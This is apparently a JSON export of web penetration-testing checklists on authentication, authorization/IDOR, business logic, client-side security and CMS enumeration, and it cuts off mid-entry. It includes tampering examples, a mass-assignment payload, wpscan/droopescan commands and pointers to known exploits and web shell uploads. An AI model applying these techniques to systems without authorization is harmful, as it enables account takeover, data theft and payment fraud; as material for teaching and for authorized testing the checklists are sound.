    "content": "# Authentication & Session Management Testing\r\n\r\n## Objective\r\n\r\nAssess the application's authentication mechanisms, session management, password recovery, and account controls to identify authentication bypasses, weak credential handling, and session-related vulnerabilities.\r\n\r\n> **Rule:** Every login mechanism should be considered a potential attack surface.\r\n\r\n---\r\n\r\n# 1. User Registration\r\n\r\nReview the registration process.\r\n\r\nCheck for:\r\n\r\n- Self-registration enabled\r\n- Invite-only registration\r\n- Role assignment\r\n- Email verification bypass\r\n- Duplicate usernames/emails\r\n- Username enumeration\r\n\r\nTry modifying registration requests.\r\n\r\nExample fields:\r\n\r\n- role\r\n- isAdmin\r\n- verified\r\n- active\r\n- accountType\r\n\r\n---\r\n\r\n# 2. Login Functionality\r\n\r\nTest login behavior.\r\n\r\nCheck:\r\n\r\n- Default credentials\r\n- Weak passwords\r\n- SQL Injection\r\n- NoSQL Injection\r\n- LDAP Injection\r\n- Username enumeration\r\n- Account lockout\r\n- Rate limiting\r\n\r\nObserve differences in:\r\n\r\n- Status codes\r\n- Response length\r\n- Error messages\r\n- Response time\r\n\r\n---\r\n\r\n# 3. Password Policy\r\n\r\nEvaluate:\r\n\r\n- Minimum length\r\n- Complexity\r\n- Password reuse\r\n- Password history\r\n- Common passwords\r\n- Maximum length restrictions\r\n\r\nWeak password policies often enable password spraying.\r\n\r\n---\r\n\r\n# 4. Password Spraying\r\n\r\nIf multiple usernames are known, test a small set of common passwords.\r\n\r\nUseful tools:\r\n\r\n- Burp Intruder\r\n- Hydra\r\n- CredSpray\r\n\r\nAlways consider:\r\n\r\n- Account lockout policy\r\n- Rate limiting\r\n- Engagement scope\r\n\r\n---\r\n\r\n# 5. Password Reset Functionality\r\n\r\nReview:\r\n\r\n- Reset tokens\r\n- OTPs\r\n- Security questions\r\n- Email verification\r\n- Token expiration\r\n- Token reuse\r\n\r\nAttempt:\r\n\r\n- Token prediction\r\n- Token replay\r\n- User enumeration\r\n- Host header injection\r\n- Password reset poisoning\r\n\r\n---\r\n\r\n# 6. Multi-Factor Authentication (MFA)\r\n\r\nIf MFA exists:\r\n\r\nCheck:\r\n\r\n- MFA enforcement\r\n- Backup codes\r\n- Recovery workflow\r\n- Session reuse\r\n- Remember-me functionality\r\n\r\nAttempt:\r\n\r\n- MFA bypass\r\n- Direct API access\r\n- Alternate authentication flows\r\n\r\n---\r\n\r\n# 7. Session Management\r\n\r\nInspect session cookies.\r\n\r\nCheck:\r\n\r\n- Secure\r\n- HttpOnly\r\n- SameSite\r\n- Expiration\r\n- Rotation after login\r\n- Rotation after password change\r\n- Logout invalidation\r\n\r\nDetermine whether:\r\n\r\n- Sessions expire correctly\r\n- Old sessions remain valid\r\n- Multiple concurrent sessions are allowed\r\n\r\n---\r\n\r\n# 8. Session Fixation\r\n\r\nAttempt to authenticate using a pre-existing session.\r\n\r\nCheck whether the session ID changes after successful login.\r\n\r\n---\r\n\r\n# 9. Session Hijacking\r\n\r\nIf another valid session is obtained:\r\n\r\nAttempt:\r\n\r\n- Cookie replay\r\n- Session reuse\r\n- Session cloning\r\n\r\nVerify whether the application detects concurrent use.\r\n\r\n---\r\n\r\n# 10. Remember-Me Functionality\r\n\r\nReview persistent login cookies.\r\n\r\nDetermine:\r\n\r\n- Plaintext values\r\n- Predictable tokens\r\n- Long-lived sessions\r\n- Server-side validation\r\n\r\n---\r\n\r\n# 11. JWT Testing\r\n\r\nIf JWTs are used:\r\n\r\nInspect:\r\n\r\n- Header\r\n- Payload\r\n- Signature\r\n- Expiration\r\n- Algorithm\r\n\r\nLook for:\r\n\r\n- Information disclosure\r\n- Weak algorithms\r\n- Missing signature validation\r\n- Long expiration\r\n\r\nDo **not** assume a JWT is secure just because it is signed.\r\n\r\n---\r\n\r\n# 12. OAuth / SSO\r\n\r\nIf OAuth or Single Sign-On is present:\r\n\r\nReview:\r\n\r\n- Redirect URIs\r\n- State parameter\r\n- Scope\r\n- Token reuse\r\n- Logout behavior\r\n\r\n---\r\n\r\n# 13. Account Lockout\r\n\r\nDetermine:\r\n\r\n- Lockout threshold\r\n- Lockout duration\r\n- CAPTCHA enforcement\r\n- IP-based restrictions\r\n\r\n---\r\n\r\n# 14. Logout Functionality\r\n\r\nVerify:\r\n\r\n- Session invalidation\r\n- Token invalidation\r\n- Cookie deletion\r\n- Browser back-button behavior\r\n\r\n---\r\n\r\n# 15. Compare Different Accounts\r\n\r\nCreate multiple users if possible.\r\n\r\nCompare:\r\n\r\n- Login responses\r\n- Session cookies\r\n- Available functionality\r\n- API responses\r\n\r\nDifferent user roles often expose hidden behavior.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Always create at least two user accounts if registration is available.\r\n- Compare authenticated and unauthenticated requests.\r\n- Compare low-privilege and high-privilege users.\r\n- Review every authentication-related API endpoint.\r\n- Password reset functionality is frequently overlooked but commonly vulnerable.\r\n- Always inspect cookies and JWTs after login.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Test user registration.\r\n- [ ] Test login functionality.\r\n- [ ] Review password policy.\r\n- [ ] Perform password spraying (if permitted).\r\n- [ ] Test password reset workflow.\r\n- [ ] Assess MFA implementation.\r\n- [ ] Review session management.\r\n- [ ] Test session fixation.\r\n- [ ] Test session hijacking.\r\n- [ ] Review Remember-Me functionality.\r\n- [ ] Analyze JWTs.\r\n- [ ] Test OAuth / SSO (if present).\r\n- [ ] Evaluate account lockout.\r\n- [ ] Verify logout behavior.\r\n- [ ] Compare multiple user accounts.",
    "headings": [],
    "commands": [],
    "tags": [
      "burp",
      "ldap",
      "jwt",
      "rce"
    ],
    "size": 4833,
    "lineCount": 292
  },
  {
    "id": "web-checklist-06-authorization-access-control-testing",
    "title": "Authorization & Access Control Testing",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/06. Authorization & Access Control Testing.md",
    "content": "# Authorization & Access Control Testing\r\n\r\n## Objective\r\n\r\nDetermine whether users can access resources, functions, or data beyond their intended permissions by manipulating requests, identifiers, roles, or APIs.\r\n\r\n> **Rule:** Authentication verifies *who you are*. Authorization determines *what you can access*. Never assume authentication implies proper authorization.\r\n\r\n---\r\n\r\n# 1. Horizontal Privilege Escalation (IDOR)\r\n\r\nTest whether you can access another user's resources.\r\n\r\nExamples:\r\n\r\n```\r\n/profile?id=10\r\n```\r\n\r\n↓\r\n\r\n```\r\n/profile?id=11\r\n```\r\n\r\nCommon targets:\r\n\r\n- Profiles\r\n- Orders\r\n- Invoices\r\n- Messages\r\n- Documents\r\n- Images\r\n- Tickets\r\n- API Objects\r\n\r\n---\r\n\r\n# 2. Vertical Privilege Escalation\r\n\r\nDetermine whether a low-privileged user can access administrator functionality.\r\n\r\nLook for:\r\n\r\n- `/admin`\r\n- `/dashboard`\r\n- `/manage`\r\n- `/staff`\r\n- `/internal`\r\n- `/api/admin`\r\n\r\nTest:\r\n\r\n- Direct browsing\r\n- API endpoints\r\n- Hidden links\r\n- JavaScript endpoints\r\n\r\n---\r\n\r\n# 3. Forced Browsing\r\n\r\nTry accessing resources directly.\r\n\r\nExamples:\r\n\r\n```\r\n/admin\r\n/admin.php\r\n/manage\r\n/debug\r\n/dev\r\n/test\r\n```\r\n\r\nAlso check:\r\n\r\n- robots.txt\r\n- sitemap.xml\r\n- JavaScript\r\n- Backup files\r\n\r\n---\r\n\r\n# 4. Parameter Tampering\r\n\r\nModify parameters.\r\n\r\nExamples:\r\n\r\n```\r\nrole=user\r\n```\r\n\r\n↓\r\n\r\n```\r\nrole=admin\r\n```\r\n\r\n```\r\nuserid=15\r\n```\r\n\r\n↓\r\n\r\n```\r\nuserid=1\r\n```\r\n\r\nTest:\r\n\r\n- User IDs\r\n- UUIDs\r\n- Roles\r\n- Status\r\n- Permissions\r\n- Prices\r\n- Account IDs\r\n\r\n---\r\n\r\n# 5. Mass Assignment\r\n\r\nAdd parameters that are not exposed by the client.\r\n\r\nExamples:\r\n\r\n```json\r\n{\r\n  \"username\":\"test\",\r\n  \"password\":\"Password123!\",\r\n  \"role\":\"admin\",\r\n  \"isAdmin\":true,\r\n  \"verified\":true,\r\n  \"active\":true\r\n}\r\n```\r\n\r\nInteresting fields:\r\n\r\n- role\r\n- admin\r\n- isAdmin\r\n- verified\r\n- active\r\n- permissions\r\n- accountType\r\n- tenant\r\n- group\r\n\r\n---\r\n\r\n# 6. HTTP Method Testing\r\n\r\nTry alternative HTTP methods.\r\n\r\nExamples:\r\n\r\nGET\r\n\r\nPOST\r\n\r\nPUT\r\n\r\nPATCH\r\n\r\nDELETE\r\n\r\nOPTIONS\r\n\r\nSome endpoints only enforce authorization on specific methods.\r\n\r\n---\r\n\r\n# 7. Compare Multiple Users\r\n\r\nCreate at least two accounts whenever registration is available.\r\n\r\nCompare:\r\n\r\n- Responses\r\n- Cookies\r\n- JWTs\r\n- API requests\r\n- Available functionality\r\n\r\nDifferent users often reveal authorization flaws.\r\n\r\n---\r\n\r\n# 8. JWT Authorization\r\n\r\nInspect JWT payloads.\r\n\r\nLook for:\r\n\r\n- role\r\n- admin\r\n- userid\r\n- permissions\r\n- groups\r\n\r\nIf the application trusts client-controlled claims, changing these values may affect authorization.\r\n\r\n---\r\n\r\n# 9. API Authorization\r\n\r\nTest every API endpoint.\r\n\r\nQuestions to ask:\r\n\r\n- Can another user access this object?\r\n- Can a normal user call an admin API?\r\n- Can parameters be modified?\r\n- Can hidden fields be supplied?\r\n\r\n---\r\n\r\n# 10. File Access\r\n\r\nAttempt to access:\r\n\r\n- Other users' uploads\r\n- Private documents\r\n- Exported reports\r\n- Backups\r\n\r\nChange:\r\n\r\n```\r\n/uploads/user1/file.pdf\r\n```\r\n\r\n↓\r\n\r\n```\r\n/uploads/user2/file.pdf\r\n```\r\n\r\n---\r\n\r\n# 11. Function-Level Authorization\r\n\r\nEvery button usually corresponds to an API request.\r\n\r\nTry calling the request directly.\r\n\r\nExamples:\r\n\r\n- Delete User\r\n- Create User\r\n- Promote User\r\n- Change Password\r\n- Export Data\r\n\r\nNever trust hidden buttons.\r\n\r\n---\r\n\r\n# 12. Multi-Tenant Testing\r\n\r\nIf multiple organizations or tenants exist:\r\n\r\nTry changing:\r\n\r\n- Organization ID\r\n- Tenant ID\r\n- Customer ID\r\n- Company ID\r\n\r\nLook for cross-tenant data access.\r\n\r\n---\r\n\r\n# 13. Object-Level Authorization (API)\r\n\r\nTest every identifier.\r\n\r\nExamples:\r\n\r\n```\r\n/api/users/5\r\n```\r\n\r\n↓\r\n\r\n```\r\n/api/users/6\r\n```\r\n\r\n```\r\n/api/orders/100\r\n```\r\n\r\n↓\r\n\r\n```\r\n/api/orders/101\r\n```\r\n\r\nAPIs are frequently vulnerable to Broken Object Level Authorization (BOLA).\r\n\r\n---\r\n\r\n# 14. Business Workflow Authorization\r\n\r\nTest workflow restrictions.\r\n\r\nExamples:\r\n\r\n- Approve your own request\r\n- Cancel another user's order\r\n- Skip approval steps\r\n- Modify completed transactions\r\n- Access hidden workflow stages\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Every numeric ID should be tested.\r\n- Every UUID should be tested.\r\n- Every hidden API endpoint should be tested.\r\n- Compare low-privilege and administrator accounts.\r\n- Test authorization on both the UI and the API.\r\n- Hidden buttons do **not** provide security.\r\n- Always intercept requests with Burp before assuming access is denied.\r\n\r\nFor every request ask 'Can I':\r\n\r\n- Remove authentication?\r\n- Use another user's ID?\r\n- Use another user's UUID?\r\n- Add admin=true?\r\n- Change role=user → admin?\r\n- Replay the request?\r\n- Change the HTTP method?\r\n- Access the endpoint directly?\r\n- Perform the action twice?\r\n- Call the API instead of using the UI?\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Test Horizontal Privilege Escalation (IDOR).\r\n- [ ] Test Vertical Privilege Escalation.\r\n- [ ] Perform Forced Browsing.\r\n- [ ] Modify parameters.\r\n- [ ] Test Mass Assignment.\r\n- [ ] Test alternative HTTP methods.\r\n- [ ] Compare multiple user accounts.\r\n- [ ] Review JWT authorization.\r\n- [ ] Test API authorization.\r\n- [ ] Test file access controls.\r\n- [ ] Test function-level authorization.\r\n- [ ] Test multi-tenant isolation.\r\n- [ ] Test object-level authorization (BOLA).\r\n- [ ] Test business workflow authorization.",
    "headings": [],
    "commands": [],
    "tags": [
      "burp",
      "jwt",
      "idor",
      "rce"
    ],
    "size": 5200,
    "lineCount": 362
  },
  {
    "id": "web-checklist-10-business-logic-testing",
    "title": "Business Logic Testing",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/10. Business Logic Testing.md",
    "content": "# Business Logic Testing\r\n\r\n## Objective\r\n\r\nIdentify flaws in the application's workflow, business rules, and transaction logic that allow unauthorized actions, financial abuse, privilege escalation, or bypassing intended restrictions.\r\n\r\n> **Rule:** Think like a malicious user, not just a penetration tester. Ask yourself, \"What assumptions is the application making?\"\r\n\r\n---\r\n\r\n# 1. Understand the Workflow\r\n\r\nBefore testing:\r\n\r\n- Register a new account\r\n- Browse every feature\r\n- Understand the normal workflow\r\n- Identify business rules\r\n- Identify trust boundaries\r\n\r\nQuestions to ask:\r\n\r\n- What is the expected behavior?\r\n- What assumptions does the application make?\r\n- Can I skip a required step?\r\n\r\n---\r\n\r\n# 2. Price Manipulation\r\n\r\nInspect every purchase request.\r\n\r\nModify:\r\n\r\n- Price\r\n- Quantity\r\n- Currency\r\n- Discounts\r\n- Tax\r\n- Shipping Cost\r\n\r\nExamples:\r\n\r\n```\r\nprice=100\r\n```\r\n\r\n↓\r\n\r\n```\r\nprice=1\r\n```\r\n\r\n```\r\nquantity=5\r\n```\r\n\r\n↓\r\n\r\n```\r\nquantity=-5\r\n```\r\n\r\n---\r\n\r\n# 3. Coupon & Discount Abuse\r\n\r\nTest:\r\n\r\n- Reuse expired coupons\r\n- Apply multiple coupons\r\n- Negative discounts\r\n- Apply coupon after payment\r\n- Remove coupon after validation\r\n- Reuse one-time coupons\r\n\r\n---\r\n\r\n# 4. Payment Logic\r\n\r\nCheck whether you can:\r\n\r\n- Skip payment\r\n- Pay less\r\n- Pay twice\r\n- Cancel after payment\r\n- Modify payment status\r\n- Replay payment requests\r\n\r\n---\r\n\r\n# 5. Quantity Manipulation\r\n\r\nTry:\r\n\r\n```\r\n0\r\n```\r\n\r\n```\r\n-1\r\n```\r\n\r\n```\r\n999999999\r\n```\r\n\r\n```\r\n0.5\r\n```\r\n\r\n```\r\n1e10\r\n```\r\n\r\n---\r\n\r\n# 6. Workflow Bypass\r\n\r\nAttempt to skip required steps.\r\n\r\nExamples:\r\n\r\n```\r\nRegister\r\n↓\r\n\r\nLogin\r\n↓\r\n\r\nPurchase\r\n```\r\n\r\nCan you directly access:\r\n\r\n```\r\n/checkout\r\n```\r\n\r\nWithout:\r\n\r\n```\r\n/cart\r\n```\r\n\r\n---\r\n\r\n# 7. Approval Workflow\r\n\r\nTest:\r\n\r\n- Approve your own request\r\n- Reject another user's request\r\n- Skip manager approval\r\n- Replay approval requests\r\n- Modify approval status\r\n\r\n---\r\n\r\n# 8. Race Conditions\r\n\r\nIdentify operations involving:\r\n\r\n- Payments\r\n- Wallets\r\n- Coupons\r\n- Gift Cards\r\n- Reward Points\r\n- Transfers\r\n- Inventory\r\n\r\nAttempt:\r\n\r\n- Duplicate requests\r\n- Simultaneous requests\r\n- Replay requests\r\n\r\nUse:\r\n\r\n- Burp Repeater (Send Group)\r\n- Turbo Intruder\r\n\r\n---\r\n\r\n# 9. Replay Attacks\r\n\r\nRepeat requests.\r\n\r\nExamples:\r\n\r\n- Purchase\r\n- Payment\r\n- Password Reset\r\n- OTP Verification\r\n- Coupon Redemption\r\n- Invitation Acceptance\r\n\r\nDetermine whether requests can be reused.\r\n\r\n---\r\n\r\n# 10. State Manipulation\r\n\r\nModify:\r\n\r\n```\r\nstatus=pending\r\n```\r\n\r\n↓\r\n\r\n```\r\nstatus=approved\r\n```\r\n\r\n```\r\nverified=false\r\n```\r\n\r\n↓\r\n\r\n```\r\nverified=true\r\n```\r\n\r\n---\r\n\r\n# 11. Client-Side Validation\r\n\r\nNever trust JavaScript.\r\n\r\nRemove:\r\n\r\n- Disabled buttons\r\n- Hidden fields\r\n- Read-only fields\r\n- Client-side validation\r\n\r\nModify requests directly in Burp.\r\n\r\n---\r\n\r\n# 12. Time-Based Logic\r\n\r\nTest:\r\n\r\n- Expired tokens\r\n- Expired coupons\r\n- Password reset links\r\n- Invitation links\r\n- Trial periods\r\n\r\nCan expired objects still be used?\r\n\r\n---\r\n\r\n# 13. User Role Changes\r\n\r\nAttempt to modify:\r\n\r\n```\r\nrole=user\r\n```\r\n\r\n↓\r\n\r\n```\r\nrole=admin\r\n```\r\n\r\n```\r\nisAdmin=false\r\n```\r\n\r\n↓\r\n\r\n```\r\nisAdmin=true\r\n```\r\n\r\n---\r\n\r\n# 14. OTP Logic\r\n\r\nCheck:\r\n\r\n- OTP reuse\r\n- OTP prediction\r\n- OTP replay\r\n- OTP brute force\r\n- OTP expiration\r\n- OTP race conditions\r\n\r\n---\r\n\r\n# 15. Email Verification\r\n\r\nTest:\r\n\r\n- Skip verification\r\n- Reuse verification token\r\n- Modify email address\r\n- Replay verification requests\r\n\r\n---\r\n\r\n# 16. Account Lifecycle\r\n\r\nTest:\r\n\r\n- Deleted accounts\r\n- Disabled accounts\r\n- Locked accounts\r\n- Pending accounts\r\n\r\nCan they still:\r\n\r\n- Login?\r\n- Reset password?\r\n- Access APIs?\r\n\r\n---\r\n\r\n# 17. Transaction Integrity\r\n\r\nDetermine whether transactions can be:\r\n\r\n- Modified\r\n- Replayed\r\n- Cancelled\r\n- Duplicated\r\n- Reversed\r\n\r\n---\r\n\r\n# 18. Hidden Features\r\n\r\nLook for:\r\n\r\n- Beta features\r\n- Debug endpoints\r\n- Hidden buttons\r\n- Hidden API routes\r\n\r\n---\r\n\r\n# 19. Compare User Roles\r\n\r\nCreate:\r\n\r\n- Guest\r\n- User\r\n- Premium User\r\n- Moderator\r\n- Administrator\r\n\r\nCompare every workflow.\r\n\r\n---\r\n\r\n# 20. Think Like a User\r\n\r\nAsk yourself:\r\n\r\n- Can I perform this action twice?\r\n- Can I perform it out of order?\r\n- Can I perform it faster than expected?\r\n- Can I perform it as another user?\r\n- Can I avoid paying?\r\n- Can I gain more than I should?\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Business Logic vulnerabilities are rarely discovered by automated scanners.\r\n- Follow the normal workflow before attempting to break it.\r\n- Test every financial transaction.\r\n- Replay every important request.\r\n- Race conditions often occur in payment, coupon, and wallet functionality.\r\n- If the application trusts client-supplied values, try modifying them.\r\n- Compare workflows between different user roles.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Understand the application workflow.\r\n- [ ] Test price manipulation.\r\n- [ ] Test coupon abuse.\r\n- [ ] Test payment logic.\r\n- [ ] Test quantity manipulation.\r\n- [ ] Test workflow bypass.\r\n- [ ] Test approval processes.\r\n- [ ] Test race conditions.\r\n- [ ] Test replay attacks.\r\n- [ ] Test state manipulation.\r\n- [ ] Bypass client-side validation.\r\n- [ ] Test time-based logic.\r\n- [ ] Test role changes.\r\n- [ ] Test OTP implementation.\r\n- [ ] Test email verification.\r\n- [ ] Test account lifecycle.\r\n- [ ] Test transaction integrity.\r\n- [ ] Look for hidden functionality.\r\n- [ ] Compare user roles.\r\n- [ ] Challenge every business assumption.",
    "headings": [],
    "commands": [],
    "tags": [
      "burp",
      "rce"
    ],
    "size": 5384,
    "lineCount": 407
  },
  {
    "id": "web-checklist-12-client-side-security-testing",
    "title": "Client-Side Security Testing",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/12. Client-Side Security Testing.md",
    "content": "# Client-Side Security Testing\r\n\r\n## Objective\r\n\r\nAssess client-side code, browser storage, security policies, and browser-based functionality for vulnerabilities that could lead to XSS, information disclosure, privilege escalation, or bypass of security controls.\r\n\r\n> **Rule:** Never assume JavaScript is just presentation logic. Modern applications often implement authentication, authorization, and business logic on the client.\r\n\r\n---\r\n\r\n# 1. JavaScript Analysis\r\n\r\nReview every JavaScript file.\r\n\r\nLook for:\r\n\r\n- Hidden API endpoints\r\n- Hardcoded credentials\r\n- API Keys\r\n- Access Tokens\r\n- Internal URLs\r\n- Feature flags\r\n- Hidden admin functionality\r\n- Debug code\r\n\r\nUseful tools:\r\n\r\n- LinkFinder\r\n- SecretFinder\r\n- JSParser\r\n- Burp Suite\r\n\r\n---\r\n\r\n# 2. DOM-Based XSS\r\n\r\nIdentify user-controlled data flowing into dangerous DOM sinks.\r\n\r\nCommon sources:\r\n\r\n- URL\r\n- Hash fragment\r\n- postMessage\r\n- localStorage\r\n- sessionStorage\r\n- Cookies\r\n\r\nCommon sinks:\r\n\r\n- innerHTML\r\n- outerHTML\r\n- document.write()\r\n- eval()\r\n- setTimeout()\r\n- setInterval()\r\n\r\n---\r\n\r\n# 3. Browser Storage\r\n\r\nInspect:\r\n\r\n- localStorage\r\n- sessionStorage\r\n- IndexedDB\r\n- WebSQL (legacy)\r\n- Cookies\r\n\r\nLook for:\r\n\r\n- JWTs\r\n- Session Tokens\r\n- API Keys\r\n- User Information\r\n- Secrets\r\n\r\n---\r\n\r\n# 4. Cookie Security\r\n\r\nReview every cookie.\r\n\r\nCheck:\r\n\r\n- Secure\r\n- HttpOnly\r\n- SameSite\r\n- Expiration\r\n- Scope\r\n\r\nDetermine whether sensitive information is stored in client-accessible cookies.\r\n\r\n---\r\n\r\n# 5. Cross-Origin Resource Sharing (CORS)\r\n\r\nReview:\r\n\r\n- Access-Control-Allow-Origin\r\n- Access-Control-Allow-Credentials\r\n- Access-Control-Allow-Headers\r\n- Access-Control-Allow-Methods\r\n\r\nLook for:\r\n\r\n- Wildcard origins\r\n- Reflection of Origin header\r\n- Credentialed cross-origin requests\r\n\r\n---\r\n\r\n# 6. Content Security Policy (CSP)\r\n\r\nReview:\r\n\r\n- script-src\r\n- object-src\r\n- default-src\r\n- frame-src\r\n- connect-src\r\n\r\nDetermine whether CSP meaningfully restricts script execution.\r\n\r\n---\r\n\r\n# 7. Clickjacking\r\n\r\nCheck:\r\n\r\n- X-Frame-Options\r\n- Content-Security-Policy (frame-ancestors)\r\n\r\nAttempt embedding the application inside an iframe.\r\n\r\n---\r\n\r\n# 8. postMessage()\r\n\r\nReview JavaScript for:\r\n\r\n```javascript\r\nwindow.postMessage()\r\n```\r\n\r\nCheck:\r\n\r\n- Origin validation\r\n- Message validation\r\n- Sensitive data exposure\r\n\r\n---\r\n\r\n# 9. Web Workers\r\n\r\nIdentify:\r\n\r\n- Dedicated Workers\r\n- Shared Workers\r\n- Service Workers\r\n\r\nReview:\r\n\r\n- Cached resources\r\n- Offline functionality\r\n- Sensitive data\r\n\r\n---\r\n\r\n# 10. Service Workers\r\n\r\nInspect:\r\n\r\n- Cache contents\r\n- Cached API responses\r\n- Offline resources\r\n\r\nDetermine whether sensitive data is cached.\r\n\r\n---\r\n\r\n# 11. Source Maps\r\n\r\nLook for:\r\n\r\n```text\r\n*.map\r\n```\r\n\r\nReview:\r\n\r\n- Original source code\r\n- Comments\r\n- Internal function names\r\n- Secrets\r\n\r\n---\r\n\r\n# 12. Client-Side Routing\r\n\r\nFor SPAs (React, Angular, Vue):\r\n\r\nCheck:\r\n\r\n- Hidden routes\r\n- Admin routes\r\n- Debug pages\r\n- Feature flags\r\n\r\n---\r\n\r\n# 13. Browser Developer Tools\r\n\r\nInspect:\r\n\r\n- Console\r\n- Network\r\n- Storage\r\n- Sources\r\n- Performance\r\n\r\nLook for:\r\n\r\n- Debug messages\r\n- Tokens\r\n- Secrets\r\n- Hidden requests\r\n\r\n---\r\n\r\n# 14. Sensitive Information Disclosure\r\n\r\nReview:\r\n\r\n- JavaScript comments\r\n- Source maps\r\n- Browser storage\r\n- Console output\r\n- Error messages\r\n\r\n---\r\n\r\n# 15. Checklist\r\n\r\n- [ ] Review JavaScript files.\r\n- [ ] Test for DOM-based XSS.\r\n- [ ] Inspect browser storage.\r\n- [ ] Review cookie security.\r\n- [ ] Test CORS configuration.\r\n- [ ] Review CSP.\r\n- [ ] Test for Clickjacking.\r\n- [ ] Analyze postMessage().\r\n- [ ] Review Web Workers.\r\n- [ ] Review Service Workers.\r\n- [ ] Search for source maps.\r\n- [ ] Inspect SPA routes.\r\n- [ ] Use browser developer tools.\r\n- [ ] Check for client-side information disclosure.",
    "headings": [],
    "commands": [],
    "tags": [
      "burp",
      "jwt",
      "rce",
      "xss"
    ],
    "size": 3745,
    "lineCount": 257
  },
  {
    "id": "web-checklist-11-cms-framework-enterprise-application-testing",
    "title": "CMS, Framework & Enterprise Application Testing",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/11. CMS, Framework & Enterprise Application Testing.md",
    "content": "# CMS, Framework & Enterprise Application Testing\r\n\r\n## Objective\r\n\r\nIdentify the CMS, framework, or enterprise application in use, enumerate version-specific functionality, discover administrative interfaces, identify weak configurations, abuse built-in functionality, and verify publicly known vulnerabilities.\r\n\r\n> **Rule:** Once the technology is identified, stop generic testing and switch to framework-specific enumeration.\r\n\r\n---\r\n\r\n# 1. Technology Identification\r\n\r\nIdentify the underlying technology using:\r\n\r\n- HTTP Headers\r\n- HTML Source\r\n- Cookies\r\n- Error Pages\r\n- JavaScript\r\n- Login Pages\r\n- robots.txt\r\n- Favicon\r\n- Default directories\r\n- EyeWitness screenshots\r\n\r\nUseful tools:\r\n\r\n- WhatWeb\r\n- Wappalyzer\r\n- EyeWitness\r\n- Nmap HTTP scripts\r\n\r\nIdentify:\r\n\r\n- CMS / Framework\r\n- Version\r\n- Web Server\r\n- Operating System\r\n- Programming Language\r\n\r\n---\r\n\r\n# 2. Version Enumeration\r\n\r\nDetermine the exact version.\r\n\r\nSources:\r\n\r\n- Meta Tags\r\n- README files\r\n- CHANGELOG files\r\n- XML manifests\r\n- JavaScript\r\n- HTML comments\r\n- Dependency files\r\n\r\nAlways search:\r\n\r\n- SearchSploit\r\n- Exploit-DB\r\n- GitHub PoCs\r\n- Vendor Advisories\r\n- NVD\r\n\r\n---\r\n\r\n# 3. Administrative Interfaces\r\n\r\nLook for:\r\n\r\n```text\r\n/admin\r\n/wp-admin\r\n/administrator\r\n/manager\r\n/host-manager\r\n/login\r\n/backend\r\n/cms\r\n```\r\n\r\nCheck:\r\n\r\n- Default Credentials\r\n- Weak Passwords\r\n- Login Bruteforce Protection\r\n\r\n---\r\n\r\n# 4. Framework-Specific Enumeration\r\n\r\n---\r\n\r\n## WordPress\r\n\r\nIdentify:\r\n\r\n- Version\r\n- Users\r\n- Plugins\r\n- Themes\r\n- XML-RPC\r\n\r\nUseful tool:\r\n\r\n```bash\r\nwpscan --url http://<TARGET> --enumerate ap,at,u\r\n```\r\n\r\nCheck:\r\n\r\n- Vulnerable plugins\r\n- Vulnerable themes\r\n- Upload directory\r\n- Backups\r\n- xmlrpc.php\r\n\r\nAttempt:\r\n\r\n- XML-RPC Bruteforce\r\n- Plugin exploits\r\n- Theme exploits\r\n- Weak credentials\r\n\r\n---\r\n\r\n## Joomla\r\n\r\nIdentify:\r\n\r\n- Version\r\n- Components\r\n- Templates\r\n- Extensions\r\n\r\nUseful tools:\r\n\r\n- droopescan\r\n- JoomlaScan\r\n\r\nCheck:\r\n\r\n- README.txt\r\n- joomla.xml\r\n- Administrator panel\r\n\r\nAttempt:\r\n\r\n- Default credentials\r\n- Template editing\r\n- Component exploits\r\n- Template web shell upload\r\n\r\n---\r\n\r\n## Drupal\r\n\r\nIdentify:\r\n\r\n- Version\r\n- Nodes\r\n- Modules\r\n- Themes\r\n\r\nUseful tool:\r\n\r\n```bash\r\ndroopescan scan drupal -u http://<TARGET>\r\n```\r\n\r\nCheck:\r\n\r\n- CHANGELOG.txt\r\n- README.txt\r\n- /node/<id>\r\n\r\nAttempt:\r\n\r\n- Drupalgeddon\r\n- Drupalgeddon2\r\n- Drupalgeddon3\r\n- PHP Filter Module (legacy versions)\r\n\r\n---\r\n\r\n## Laravel\r\n\r\nCheck:\r\n\r\n```text\r\n/.env\r\n/_ignition\r\n/storage/logs\r\n/vendor\r\n```\r\n\r\nLook for:\r\n\r\n- APP_KEY disclosure\r\n- Debug mode\r\n- Ignition\r\n- Environment file exposure\r\n\r\n---\r\n\r\n## Django\r\n\r\nCheck:\r\n\r\n```text\r\n/admin\r\n```\r\n\r\nReview:\r\n\r\n- Debug pages\r\n- Static files\r\n- CSRF implementation\r\n\r\n---\r\n\r\n## Spring Boot\r\n\r\nCheck:\r\n\r\n```text\r\n/actuator\r\n```\r\n\r\nInteresting endpoints:\r\n\r\n- health\r\n- env\r\n- heapdump\r\n- mappings\r\n- metrics\r\n- beans\r\n\r\n---\r\n\r\n## ASP.NET\r\n\r\nReview:\r\n\r\n- ViewState\r\n- EventValidation\r\n- Trace.axd\r\n- Elmah\r\n- Web.config\r\n\r\n---\r\n\r\n## Tomcat\r\n\r\nCheck:\r\n\r\n```text\r\n/manager\r\n/host-manager\r\n/docs\r\n```\r\n\r\nAttempt:\r\n\r\n- Default credentials\r\n- WAR upload\r\n- CGI vulnerabilities\r\n- Tomcat Manager abuse\r\n\r\nSearch for:\r\n\r\n- CVE-2019-0232 (Tomcat CGI RCE)\r\n\r\n---\r\n\r\n## Jenkins\r\n\r\nCheck:\r\n\r\n```text\r\n/login\r\n/script\r\n/configureSecurity\r\n```\r\n\r\nAttempt:\r\n\r\n- Default credentials\r\n- Anonymous access\r\n- Script Console\r\n- Groovy code execution\r\n\r\n---\r\n\r\n## Splunk\r\n\r\nCheck:\r\n\r\n- Version\r\n- Authentication\r\n- Free/Trial mode\r\n- Management interface\r\n\r\nAttempt:\r\n\r\n- Default credentials\r\n- Search 